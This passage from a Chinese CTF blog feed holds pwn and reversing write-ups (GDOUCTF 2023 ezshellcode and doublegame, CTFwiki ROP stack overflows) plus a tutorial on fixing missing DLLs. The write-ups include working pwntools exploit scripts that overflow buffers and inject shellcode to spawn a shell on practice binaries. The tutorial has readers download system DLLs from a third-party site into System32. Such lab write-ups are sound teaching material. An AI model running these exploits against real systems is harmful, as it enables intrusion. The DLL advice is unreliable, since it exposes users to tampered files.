class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是用短的 <code>shellcode</code> 编写脚本即可</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">0</span>shellcode_addr <span class="token operator">=</span> <span class="token number">0x06010A0</span>  <span class="token comment"># 查看IDA得到bss段上name的写入地址</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ezshellcode"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node2.anna.nssctf.cn"</span><span class="token punctuation">,</span> <span class="token number">28073</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span>  <span class="token comment"># pwntools生成的默认shellcode超长，换一个短的</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please.\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x0A</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Let's start!\n"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{612a3a24-b348-47fe-b86c-30d997ca26a5}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-ezshellcode5.png" alt="2023GDOUCTF-ezshellcode5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> Shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【GDOUCTF 2023】doublegame</title>
      <link href="/posts/d65bda38.html"/>
      <url>/posts/d65bda38.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>解决 exe 由于缺少 DLL 文件导致无法运行的问题</mark></p></li><li><p>迷宫题，<mark>不过这个题有点小坑，对迷宫进行了改动，所以看到迷宫不要傻乎乎的直接复制粘贴，多看看代码里有没有对迷宫做修改</mark></p></li><li><p><mark>代码与程序输出结合分析，快速定位关键位置</mark></p></li></ul><hr><p><a href="https://www.nssctf.cn/contest/82/">（2023年4月16日）【GDOUCTF 2023】doublegame</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>解压得到一个 <code>doublegame.exe</code> 程序，运行发现是一个贪吃蛇游戏</p><blockquote><p>部分人可能像我一样，打开 exe 会弹出一个缺少 DLL 的错误，导致无法运行，<em>详见《运行程序遇到 “由于找不到 xxx.dll，无法继续执行代码”》一文</em></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame1.png" alt="2023GDOUCTF-doublegame1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame5.png" alt="2023GDOUCTF-doublegame5.png"></p><p>经过试验，后面蛇的速度会越来越快</p><p>用 64 位 IDA 打开，F5 反编译：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame2.png" alt="2023GDOUCTF-doublegame2.png"></p><p>但是什么都没有</p><p>由于没有 <code>main()</code> 函数，<code>shift + F12</code> 查看一下字符串，定位到关键位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame3.png" alt="2023GDOUCTF-doublegame3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame4.png" alt="2023GDOUCTF-doublegame4.png"></p><p>可以看到很多与 flag 有关的信息：<br>① 首先最关键的一点，告诉了 flag 的形式是 <code>HZCTF&#123;md5(path)+score&#125;</code><br>② 注意下图，有一个由很多 <code>&#39;0&#39;</code> 和 <code>&#39; &#39;</code> 组成的类似迷宫的东西，结合 <code>md5(path)</code> 可以大致推断 <code>path</code> 就是走迷宫的路径<br>③ 同时，还告诉了 <code>the first game tell the score</code>，结合文件名 <code>doublegame.exe</code> 可知，这个程序应该有两个游戏，第一个游戏是贪吃蛇，第二个游戏是走迷宫，贪吃蛇得到 <code>score</code>，走迷宫得到 <code>path</code></p><p>注意到字符串里的 <code>&quot;GAME OVER&quot;</code> 和 <code>&quot;?(y/n):&quot;</code> 与贪吃蛇游戏闯关失败时的输出有关，跟进函数位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame6.png" alt="2023GDOUCTF-doublegame6.png"></p><p>根据 <code>sub_1400111F9(&quot;GAME OVER&quot;)</code> 可以推出 <code>sub_1400111F9()</code> 函数的功能是 <code>printf()</code></p><p>重命名一下，定位到关键 <code>if</code> 判断：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame7.png" alt="2023GDOUCTF-doublegame7.png"></p><p>跟进上面两个红框中 <code>printf()</code> 的输出内容：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame8.png" alt="2023GDOUCTF-doublegame8.png"></p><p>内容是十六进制数据，结合游戏的输出，这应该是输出的某些中文内容，最后 <code>%d</code> 是一个游戏中的数据</p><p>重点在后面的一个 <code>if</code> 判断：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> dword_140022CD0 <span class="token operator">></span> <span class="token number">13371337</span> <span class="token punctuation">)</span>  <span class="token function">sub_14001136B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sub_1400110E6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>首先，最后的 <code>sub_1400110E6()</code> 函数会执行 <code>sub_140012A40()</code> 用于在本地生成一个 <code>贪吃蛇最高得分记录.txt</code> 的文本文件：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame9.png" alt="2023GDOUCTF-doublegame9.png"></p><p>关键在于当 <code>dword_140022CD0 &gt; 13371337</code> 时，会执行 <code>sub_14001136B()</code> 函数，<code>sub_14001136B()</code> 函数会执行 <code>sub_140012CF0()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame10.png" alt="2023GDOUCTF-doublegame10.png"></p><p>这个函数用来生成迷宫的，以及 <code>switch()</code> 中的 <code>&#39;w&#39;</code>、<code>&#39;a&#39;</code>、<code>&#39;s&#39;</code>、<code>&#39;d&#39;</code> 用来控制方向<br>由于这是第二个游戏，明显 <code>dword_140022CD0 &gt; 13371337</code> 就是通关条件</p><p><strong>（可能是分数 <code>score &gt; 13371337</code> 就进入下一关，这里只是猜测，后面会验证，所以仅凭徒手玩游戏通关是几乎不可能的了）</strong></p><p>将 <code>sub_140012CF0()</code> 函数提供的迷宫数据提取出来<br><mark>但是这里有个小坑，很重要，没有发现的话是做不出来的</mark>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame12.png" alt="2023GDOUCTF-doublegame12.png"></p><p>在上方的一堆 <code>&#39;0&#39;</code> 和 <code>&#39; &#39;</code> 都是迷宫的内容，<mark>注意最后有一个 <code>v11[4] = 48</code>，48 是 <code>&#39;0&#39;</code> 的 ASCii 码</mark>  </p><p>找到 <code>v11</code> 的位置，也就是<mark>将 <code>@11111110101111111110</code>（为了看得更清楚，我把空格用 <code>&#39;1&#39;</code> 来表示） 这一行的第 5 个位置的空格改为 <code>&#39;0&#39;</code> 了</mark>  </p><p>提取出修改后的迷宫：<br><strong>（这里有个小技巧：由于 <code>&#39;0&#39;</code> 表示墙壁，<code>&#39; &#39;</code> 表示路，可以在 Pycharm 中全选 <code>&#39; &#39;</code>，空格会有高亮，路径会更显眼）</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame11.png" alt="2023GDOUCTF-doublegame11.png"></p><p>得到路径 <code>path</code>：<code>dddssssddwwwwddssddwwwwwwddddssaassddddwwwwddwwwwddd</code><br>MD5 加密后为：<code>811173b05afff098b4e0757962127eac</code></p><p>这里来分析一下，为什么是个走迷宫，具体信息是怎么样的：<br>① 首先这里有个 <code>while</code> 循环，判断的是当前位置是否走到了出口，结合<code>（v15，v16）</code>是<code>（15，0）</code>对应 <code>&#39;@&#39;</code> 的位置，而<code>（v17，v18）</code>是<code>（7，20）</code>对应最后出口的那个点</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame13.png" alt="2023GDOUCTF-doublegame13.png"></p><p>② 再往下，注意到有一步操作会影响到后面的 <code>if</code> 条件，往左走的时候，如果当前位置是 <code>&#39;*&#39;</code> 的话，就将 <code>v7[20] = 48</code>，否则后面的 <code>if</code> 不会执行，而是输出 <code>&quot;error&quot;</code>，所以路径必须要经过 <code>&#39;*&#39;</code> 的位置</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame14.png" alt="2023GDOUCTF-doublegame14.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame15.png" alt="2023GDOUCTF-doublegame15.png"></p><p>③ 最后，注意这个 <code>if</code> 条件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame16.png" alt="2023GDOUCTF-doublegame16.png"></p><p>函数 <code>sub_140011433(0)</code> 会执行 <code>sub_140011E10(unsigned int a1)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame17.png" alt="2023GDOUCTF-doublegame17.png"></p><p>根据形式，<code>sub_14001126C(&quot;%d&quot;, &amp;v2)</code> 应该是一个 <code>scanf()</code> 函数，让用户输入的 <code>v2</code> 就是 <code>key</code>，而前面又提示说 <code>the score is saving cat&#39;s key!\n</code> ，可以知道这个 <code>v2</code> 就是 <code>score</code></p><p>由于传参 <code>a1 = 0</code>，<code>v2</code> 初值为 0，最后返回 <code>v2</code> 的值，而 <code>sub_140011433(0)</code> 的返回值为 <code>v24</code>，且 <code>v24</code> 要等于 <code>13376013</code>，所以 <code>v2 = 0x1DC4 ^ 13376013</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/2023GDOUCTF-doublegame18.png" alt="2023GDOUCTF-doublegame18.png"></p><p>最后得到 <code>v2 = 13371337</code>，<strong>验证了前面 <code>score &gt; 13371337</code> 就进入下一关的猜想</strong><br>于是得到 <code>score</code>：<code>13371337</code></p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{811173b05afff098b4e0757962127eac13371337}<br>（最终要求将 HZCTF 改为 NSSCTF）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运行程序显示 “由于找不到 xxx.dll，无法继续执行代码”</title>
      <link href="/posts/87826845.html"/>
      <url>/posts/87826845.html</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><blockquote><p>在运行 <code>.exe</code> 程序时弹出 <code>&quot;由于找不到 xxx.dll，无法继续执行代码&quot;</code> 的错误，导致程序无法执行</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E7%94%B1%E4%BA%8E%E6%89%BE%E4%B8%8D%E5%88%B0xxx.dll%E6%97%A0%E6%B3%95%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%811.png" alt="由于找不到xxx.dll无法继续执行代码1.png"></p><hr><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><blockquote><p>缺少必要的运行库文件，安装该 <code>.dll</code> 运行库文件即可</p></blockquote><hr><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><blockquote><p>在网上自行下载缺少的 <code>.dll</code> 文件，直接搜 <code>&quot;xxx.dll&quot;</code> 下载即可（因为每个人缺少的运行库各不相同，无法提供统一的 DLL 文件，但是这些文件在网上都是可以下载到的）</p><p>我这里提供一个下载 <code>.dll</code> 文件的网站：<a href="https://cn.dll-files.com/">免费下载缺失的 DLL 文件 | DLL‑files.com</a></p></blockquote><p><em>通常来说，这样的 <code>.dll</code> 库文件我们需要下载两个，一个是 32 位的，一个是 64 位的</em></p><p>我这里就以图片中所缺少的 <code>ucrtbased.dll</code> 为例：</p><ol><li><p>进入网站：<a href="https://cn.dll-files.com/">免费下载缺失的 DLL 文件 | DLL‑files.com</a>  </p></li><li><p>在搜索框中搜索 <code>ucrtbased.dll</code></p></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E7%94%B1%E4%BA%8E%E6%89%BE%E4%B8%8D%E5%88%B0xxx.dll%E6%97%A0%E6%B3%95%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%812.png" alt="由于找不到xxx.dll无法继续执行代码2.png"></p><ol start="3"><li>往下翻，找到这个位置：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E7%94%B1%E4%BA%8E%E6%89%BE%E4%B8%8D%E5%88%B0xxx.dll%E6%97%A0%E6%B3%95%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%813.png" alt="由于找不到xxx.dll无法继续执行代码3.png"></p><blockquote><p>有的 <code>.dll</code> 文件会有特别多的版本，不需要管，只需要看好架构（<code>Architecture</code>）即可</p><p><code>Architecture 64</code> 代表 64 位，<code>Architecture 32</code> 代表 32 位</p></blockquote><ol start="4"><li>将 <code>ucrtbased.dll</code> 的 64 位和 32 位文件各下载一个，版本（<code>Version</code>）随意，通常越新的版本越好</li></ol><blockquote><p>注意：</p><p><em>一定要留意下载到本地的时候哪一个压缩包是 32 位的，哪一个压缩包是 64 位的，不要搞混了</em></p></blockquote><p>解压后，我这里以文件夹的命名来区分 32 位和 64 位，<strong>实际你下载的时候两个文件命名是相同的</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E7%94%B1%E4%BA%8E%E6%89%BE%E4%B8%8D%E5%88%B0xxx.dll%E6%97%A0%E6%B3%95%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%814.png" alt="由于找不到xxx.dll无法继续执行代码4.png"></p><ol start="5"><li>首先了解一点基础知识：</li></ol><blockquote><p>在 64 位 的 Windows 系统中  </p><ul><li>放置 32 位 DLL 文件的默认路径为：<code>C:\Windows\SysWOW64\</code>  </li><li>放置 64 位 DLL 文件的默认路径为：<code>C:\Windows\System32\</code></li></ul></blockquote><p>将 <code>ucrtbased_32 文件夹</code> 内的 <code>ucrtbased.dll</code> 复制到 <code>C:\Windows\SysWOW64\</code> 路径下<br>将 <code>ucrtbased_64 文件夹</code> 内的 <code>ucrtbased.dll</code> 复制到 <code>C:\Windows\System32\</code> 路径下</p><ol start="6"><li>再次运行报错的 <code>.exe</code> 文件，观察问题是否解决</li></ol><p>如果只是缺少 <code>ucrtbased.dll</code> 这一个 DLL 库文件，那么到此为止，程序基本就已经可以正常运行了</p><p>例如我再次打开刚刚报错的 exe 程序如下图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E7%94%B1%E4%BA%8E%E6%89%BE%E4%B8%8D%E5%88%B0xxx.dll%E6%97%A0%E6%B3%95%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%815.png" alt="由于找不到xxx.dll无法继续执行代码5.png"></p><p><em>如果依然提示缺少其他的 DLL 文件，继续按此教程依次下载其他缺失的 DLL 文件即可</em></p><blockquote><p>如果上述操作都试过了，但 exe 程序仍然无法运行  </p><p>可能是因为 DLL 文件虽然复制到了目录下，但是并未注册，可以自行搜索注册 DLL 文件的教程，例如：<a href="https://jingyan.baidu.com/article/e75aca850f574c142edac6ee.html">如何注册dll文件-百度经验</a>  </p><p>因为我没有遇到过，我按照上述操作就已经成功解决问题，所以无法提供教程，但是不排除有的人会遇到这种问题</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CTFwiki】ROP栈溢出漏洞合集</title>
      <link href="/posts/fbbbaa4b.html"/>
      <url>/posts/fbbbaa4b.html</url>
      
        <content type="html"><![CDATA[<hr><p>题目文件下载链接：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow">ctf-wiki&#x2F;ctf-challenges · GitHub</a></p><hr><h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text1.png" alt="CTFwiki_ret2text1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text2.png" alt="CTFwiki_ret2text2.png"></p><p><code>get()</code> 函数存在栈溢出</p><p>查看字符串，发现 <code>&quot;/bin/sh&quot;</code>，在函数 <code>secure()</code> 中直接有构造好的 <code>system(&quot;/bin/sh&quot;)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text3.png" alt="CTFwiki_ret2text3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text4.png" alt="CTFwiki_ret2text4.png"></p><p>方法有两种：</p><ol><li><strong>可以直接绕过 if 语句跳转到地址 0x0804863A 执行 <code>system(&quot;/bin/sh&quot;)</code>（脚本一）</strong></li><li><strong>通过 <code>gets()</code> 溢出跳转到 <code>secure()</code> 函数，绕过伪随机数，使 input 满足 <code>if(input == secretcode)</code> 条件（脚本二）</strong></li></ol><p>确定溢出的偏移量<br><strong>这里直接通过 IDA 看到的偏移量是不对的</strong>：（IDA 中需要填充 0x64 + 0x4）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text5.png" alt="CTFwiki_ret2text5.png"></p><p>使用 GDB 调试一下：</p><ol><li>首先生成 200 个随机字符序列：<code>cyclic 200</code></li><li>开始调试程序： <code>gdb ret2text</code></li><li>直接运行程序，到达输入的位置：<code>r</code></li><li>输入刚刚生成的 200 个随机字符序列，发现 <code>*EIP  0x62616164 (&#39;daab&#39;)</code>、<code>Invalid address 0x62616164</code>，说明我们输入的字符覆盖了 EIP，即字符 “daab”</li><li>计算偏移量：<code>cyclic -l 0x62616164</code></li><li><strong>发现偏移了 112 字节，即：0x6c + 0x4，并不是 IDA 中的 0x64 + 0x4</strong></li></ol><p>注意这里通过 gdb 调试的溢出值是 112，也和 IDA 不同，以 gdb 的调试结果为准</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text6.png" alt="CTFwiki_ret2text6.png"></p><hr><h2 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2text"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>system_bin_sh_addr <span class="token operator">=</span> <span class="token number">0x0804863A</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_bin_sh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"There is something amazing here, do you know anything?\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 与远程交互</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text7.png" alt="CTFwiki_ret2text7.png"></p><hr><h2 id="脚本二"><a href="#脚本二" class="headerlink" title="脚本二"></a>脚本二</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2text"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2text"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'secure'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"There is something amazing here, do you know anything?\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>lib <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>lib<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>lib<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>num <span class="token operator">=</span> lib<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 与远程交互</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2text8.png" alt="CTFwiki_ret2text8.png"></p><hr><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2shellcode1.png" alt="CTFwiki_ret2shellcode1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2shellcode2.png" alt="CTFwiki_ret2shellcode2.png"></p><p><code>gets()</code> 存在栈溢出，同时将输入 <code>s</code> 复制到 <code>buf2</code>，<code>buf2</code> 存储在 bss 段上</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2shellcode3.png" alt="CTFwiki_ret2shellcode3.png"></p><p>查看 bss 段执行权限<br>gdb 打开后，先 <code>b main</code> 下断点，然后 <code>r</code> 执行<br>使用 <code>vmmap</code> 查看<br>发现 <code>buf2</code> 所在的 bss 段地址具有可执行权限</p><p>直接写入 shellcode 并执行触发即可 <strong>（注意这里通过 gdb 调试的溢出值是 112，也和 IDA 不同，以 gdb 的调试结果为准）</strong></p><hr><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/wyy/桌面/PWN/CTF-wiki/ret2shellcode"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在Linux的路径</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>bin_sh_addr <span class="token operator">=</span> <span class="token number">0x804A080</span>payload <span class="token operator">=</span> shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"No system for you this time !!!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h1><p>题目链接：<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p>分析程序：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall1.png" alt="CTFwiki_ret2syscall1.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall2.png" alt="CTFwiki_ret2syscall2.png"></p><p><code>get()</code> 存在栈溢出</p><p>由于是 32 位程序，用 ROPgadget 搜索 <code>int</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTFwiki_ret2syscall3.png" alt="CTFwiki_ret2syscall3.png"></p><p>发现存在 “<code>int 0x80</code>“，同时存在 